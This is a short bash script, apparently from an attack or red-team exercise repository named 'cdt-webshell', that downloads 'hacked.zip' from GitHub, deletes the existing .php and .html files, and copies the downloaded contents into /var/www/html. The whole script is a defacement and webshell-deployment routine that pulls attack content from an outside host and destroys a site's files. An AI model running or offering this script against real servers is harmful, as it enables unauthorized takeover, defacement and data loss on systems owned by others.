#!/bin/bash
wget https://github.com/Tyfighter98/cdt-webshell/raw/master/hacked.zip
unzip hacked.zip
rm *.php
rm *.html
cp -r ./hacked/* /var/www/html
